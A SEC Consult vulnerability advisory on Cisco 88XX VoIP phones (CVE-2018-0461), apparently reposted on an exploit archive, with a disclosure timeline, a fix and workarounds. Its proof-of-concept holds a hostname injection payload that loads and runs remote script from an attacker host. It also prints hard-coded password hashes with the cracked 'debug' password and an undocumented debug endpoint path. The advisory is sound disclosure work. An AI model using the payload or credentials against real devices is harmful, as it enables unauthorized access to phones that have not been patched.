@@ -1,0 +1,205 @@
+id: 31914
+date: 01/10/2019
+title: Cisco VoIP Script Insertion / Weak Passwords / Undocumented Functionality
+author: sec-consult
+cves: CVE-2018-0461
+
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Cisco VoIP Phones, e.g. models 88XX
+ vulnerable version: See list of vulnerable devices/firmwares below
+      fixed version: 12.5.1 MN
+         CVE number: CVE-2018-0461
+             impact: high
+           homepage: https://www.cisco.com
+              found: 10/2018
+                 by: W. Schober, IoT Inspector (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"The Cisco IP Phone 8800 Series is a great fit for businesses of all sizes
+seeking secure, high-quality, full-featured VoIP. Select models provide
+affordable entry to HD video and support for highly-active, in-campus mobile
+workers."
+
+Source:
+https://www.cisco.com/c/en/us/products/collaboration-endpoints/unified-ip-phone-8800-series/index.html
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to update the devices to the newest firmware (12.5.1 MN),
+where all the documented issues are fixed according to the vendor.
+
+We want to thank Cisco for the very professional response and great coordination.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Arbitrary Script Injection
+The VOIP phones can be managed directly via the integrated keyboard and the
+built-in screen. In the configuration menu a few spots allow users to input
+text via the integrated keyboard into text boxes (e.g. Hostname). Those text
+input fields are prone to JavaScript-like code injection. An attacker is able
+to inject arbitrary payloads via the T9 keyboard.
+
+
+2) Hard coded and weak secrets
+(Identified during an automated firmware analysis by IoT Inspector)
+The firmware, which is directly served from Cisco, contains multiple hard coded
+password hashes. They are stored in the /etc/passwd file and are hashed using
+an outdated algorithm (UNIX MD5+salt). The users are not documented anywhere.
+Access via SSH using those credentials is possible.
+
+Due to the outdated algorithm in use (UNIX MD5+Salt) and the very weak password
+it was easily possible to brute-force the password within seconds.
+
+
+3) Undocumented debug functionality
+During a manual firmware analysis a few undocumented endpoints in the
+built-in web application, which is running on the VOIP phone,
+were identified. Those routes lead to parts of the web application that are
+neither documented nor officially mentioned anywhere by Cisco. Those parts of
+the web application allow an attacker to debug the device and create memory
+dumps.
+
+
+4) Various outdated components with known vulnerabilities
+During the check a lot of outdated components were identified by their version
+numbers. It is not known which patches got backported by the vendor but Cisco
+mentioned that they have implemented some. The potentially affected components
+are:
+
+-) wpa_supplicant
+-) BusyBox
+-) Dnsmasq
+-) OpenSSL
+-) OpenSSH
+-) Linux Kernel Privilege Escalation app_keya
+-) Linux Kernel Privilege Escalation aMempodippera
+-) Multiple Linux Kernel CVE entries
+
+Please take a look at the IoT Inspector report for details:
+https://r.sec-consult.com/iotinspectorcisco
+
+
+Proof of concept:
+-----------------
+1) Arbitrary Script Injection
+A lot of settings can be changed directly on the VOIP phone via the built-in
+screen. There are also multiple locations, where user-input is parsed and
+displayed. It was possible to inject arbitrary (JavaScript) code directly into
+the phone UI. As an example the hostname of the VOIP Phone can be changed to
+the following value:
+
+hostnamea><img src=http://$IP/sec.js onload=exec()>
+
+The sec.js gets loaded from the remote host immediately and the exec function
+is executed.
+
+< A screenshot can be found online on our website >
+
+Further analysis has not been performed, but depending on the underlying
+libraries/system in use, it might be possible to get system level access via
+this attack vector.
+
+
+2) Hard coded and weak secrets
+The file at the following path contains a hard coded password for the user debug:
+/_rootfs288xx.12-0-1ES-15.sbn.extracted/squashfs-root/etc/passwd
+
+$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71 (Type: MD5 (Unix))
+
+This hash corresponds to the following clear-text password: debug
+
+The password for the user root and default is also stored in the /etc/passwd:
+nCjlgBm7.lvX2 (Type: DES (Unix)) - Users: root, default
+
+
+3) Undocumented debug functionality
+The built-in VOIP phone web server offers multiple functionalities for the
+end-user. During a manual analysis, undocumented endpoints with critical
+functionality got identified. The functionality can be found by visiting
+the following endpoint:
+
+https://$VOIP-Phone-IP/CGI/Java/Monitor
+
+Offered functionality includes:
+-) Memory Info
+-) Garbage Collection
+-) Thread Info
+-) Registration Info
+-) Properties
+-) Monitor Menu
+-) Lock Menu
+
+< A screenshot can be found online on our website >
+
+4) Various outdated components with known vulnerabilities
+No PoC available
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following firmware/device has been tested with IoT Inspector and manually:
+* Cisco IP Phone 88xx: Firmware version 12-0-1 ES-15 (ID: f86aa7612d9311e6)
+
+The following devices are also vulnerable according to the vendor:
+* IP Conference Phone 8832
+* IP Phone 8811
+* IP Phone 8841
+* IP Phone 8845
+* IP Phone 8851
+* IP Phone 8861
+* IP Phone 8865
+* Unified IP Conference Phone 8831
+* Wireless IP Phone 8821
+* Wireless IP Phone 8821-EX
+
+
+Vendor contact timeline:
+------------------------
+2018-10-17: Contacting Cisco PSIRT through psirt@cisco.com
+2018-10-17: Initial response from Cisco PSIRT. Assigned ID: PSIRT-0289060835
+            Cisco PSIRT requests that the public disclosure should be
+            shifted to January 2019 to avoid public christmas holidays.
+2018-10-18: Contacting Cisco PSIRT and agreeing on public disclosure date
+            2019-01-09.
+2018-10-24: Update from Cisco that a case owner got assigned.
+2018-10-29: Update from Cisco that they are still reviewing the vulnerabilities
+            and that they have already requested CVEs.
+2018-11-05: Update from Cisco with further details about the internal scheduling.
+2018-11-12: Update from Cisco with further details about CVEs.
+2018-11-12: Cisco assigned CVE-2018-0461 and informed us that the vulnerabilities
+            will be fixed in an upcoming release at the end of the year;
+            Requesting affected/fixed versions.
+2018-11-30: Cisco responds with affected devices and firmwares. Requesting
+            updated firmware to do another IoT inspector scan, to verify the
+            fixes.
+2019-01-09: Public release of security advisory
+
+
+Solution:
+---------
+Update the firmware of the affected devices to at least 12.5.1 MN.
+
+The vendor has published a security advisory as well:
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190109-phone-script-injection
+
+
+Workaround:
+-----------
+Disable the built-in web server
+Segment the VOIP network in a way, that access for devices other
+than VoIP phones in any direction is not possible at all.
+Remove the debug user
+
+#  0day.today [2023-03-25]  #
